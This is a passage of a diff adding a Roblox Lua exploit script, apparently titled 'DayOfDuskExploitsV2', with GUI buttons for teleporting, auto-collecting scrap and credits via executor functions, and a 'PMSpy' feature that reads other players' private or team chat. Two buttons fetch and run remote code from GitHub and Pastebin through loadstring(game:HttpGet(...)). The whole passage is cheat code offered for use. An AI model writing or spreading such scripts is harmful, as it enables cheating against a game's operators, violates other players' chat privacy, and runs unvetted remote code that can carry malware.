+		script.Parent.Parent:TweenPosition(UDim2.new(-0.5, 0,0.21, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+	script.Parent.PreviousPage4.MouseButton1Up:Connect(function()
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 296),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent.Visible = false
+		script.Parent.Parent.Page3.Visible = true
+		wait(0.1)
+		script.Parent.Parent.Transition:TweenSize(UDim2.new(0,301,0,0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+	end)
+	script.Parent.Roseweld.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-189.227997, 4.17125702, -730.945984)
+	end)
+	script.Parent.Sandingo.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(314.779999, 23.8426704, -570.870972)
+	end)
+	script.Parent.Jokeumbia.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-298.337006, -2.55994701, -1239.41699)
+	end)
+	script.Parent.PoliaxVendor.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(365.231903, 69.1878281, -1118.75659)
+	end)
+	script.Parent.Sewer.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-138, -21.6195354, -97)
+	end)
+	local CurrentHangarPit = 1
+	script.Parent.HangarPit.MouseButton1Up:Connect(function()
+		if CurrentHangarPit == 1 then
+			CurrentHangarPit = 2
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-188.309235, -23.0101624, -16.9605255)
+		elseif CurrentHangarPit == 2 then
+			CurrentHangarPit = 1
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-179.759094, -23.1443386, 53.6893921)
+		end
+	end)
+	script.Parent.ExteriorCompound.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(274.002319, 84.7926865, 35.9872551)
+	end)
+	script.Parent.RockStarOverlook.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.020599, 100.821404, -94.7786255)
+	end)
+	script.Parent.Rockstar.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(603.260254, -10.5734901, -77.9041061)
+	end)
+	script.Parent.Caves.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.517944, -22.9210186, -60.7676353)
+	end)
+	script.Parent.AegisSpawn.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(120.697205, 44.6898422, -26.581316)
+	end)
+	script.Parent.Death.MouseButton1Up:Connect(function()
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-301.544983, -25.7884655, -939.011597)
+	end)
+end
+coroutine.wrap(RPBCLI_fake_script)()
+local function LPWR_fake_script() -- MiscFrame.MiscFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.MiscFrame)
+
+	local InUse = false
+	script.Parent.PMSpy.MouseButton1Up:Connect(function()
+		enabled = true
+		spyOnMyself = true
+		public = false
+		publicItalics = false
+		privateProperties = {
+			Color = Color3.fromRGB(0,255,255); 
+			Font = Enum.Font.SourceSansBold;
+			TextSize = 18;
+		}
+		local StarterGui = game:GetService("StarterGui")
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+		local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+		local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+		local instance = (_G.chatSpyInstance or 0) + 1
+		_G.chatSpyInstance = instance
+		local function onChatted(p,msg)
+			if _G.chatSpyInstance == instance then
+				if p==player and msg:lower():sub(1,6)=="/e spy" then
+					enabled = not enabled
+					wait(0.3)
+					privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+				elseif enabled and (spyOnMyself==true or p~=player) then
+					msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+					local hidden = true
+					local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+						if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and p.Team==player.Team)) then
+							hidden = false
+						end
+					end)
+					wait(1)
+					conn:Disconnect()
+					if hidden and enabled then
+						if public then
+							saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+						else
+							privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+							StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+						end
+					end
+				end
+			end
+		end
+		for _,p in ipairs(Players:GetPlayers()) do
+			p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+		end
+		Players.PlayerAdded:Connect(function(p)
+			p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+		end)
+		privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+		player:WaitForChild("PlayerGui"):WaitForChild("Chat")
+		StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+		wait(3)
+		local chatFrame = player.PlayerGui.Chat.Frame
+		chatFrame.ChatChannelParentFrame.Visible = true
+		chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+	end)
+	script.Parent.Time.MouseButton1Up:Connect(function()
+		local player = game.Players.LocalPlayer
+		local mouse = player:GetMouse()
+
+		mouse.KeyDown:connect(function(key)
+			if key == "k" then
+				HBytfbeYGerjthfipeafy = game.Lighting.TimeOfDay
+				local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()
+				local w = library:CreateWindow(HBytfbeYGerjthfipeafy) 
+			end                 
+		end)
+	end)
+	script.Parent.ScrapGrab.MouseButton1Up:Connect(function()
+		local workspace = game:GetService("Workspace")
+		workspace.ChildAdded:Connect(function(item)
+			if item.Name == "Scrap" then
+				wait(.2)
+				if item:FindFirstChild("ClickDetector") then
+					if item.CashValue.Value > 1 then
+						fireclickdetector(item.ClickDetector, 1)
+					end
+				end
+			end
+		end)
+	end)
+	script.Parent.CreditGrab.MouseButton1Up:Connect(function()
+		local workspace = game:GetService("Workspace")
+		workspace.ChildAdded:Connect(function(item)
+			if item.Name == "Credit" then
+				wait(.2)
+				if item:FindFirstChild("ClickDetector") then
+					if item.CashValue.Value > 1 then
+						fireclickdetector(item.ClickDetector, 1)
+					end
+				end
+			end
+		end)
+	end)
+	script.Parent.AnimGui.MouseButton1Up:Connect(function()
+		_G.ToggleColor = Color3.fromRGB(255,192,203)
+		_G.ButtonColor = Color3.fromRGB(255,192,203)
+		_G.SliderColor = Color3.fromRGB(255,192,203)
+		loadstring(game:HttpGet("https://pastebin.com/raw/gE31aTaW", true))()
+	end)
+	script.Parent.BackToMenu4.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Parent.MenuFrame.Visible = true
+			script.Parent.Visible = false
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+end
+coroutine.wrap(LPWR_fake_script)()
+
+
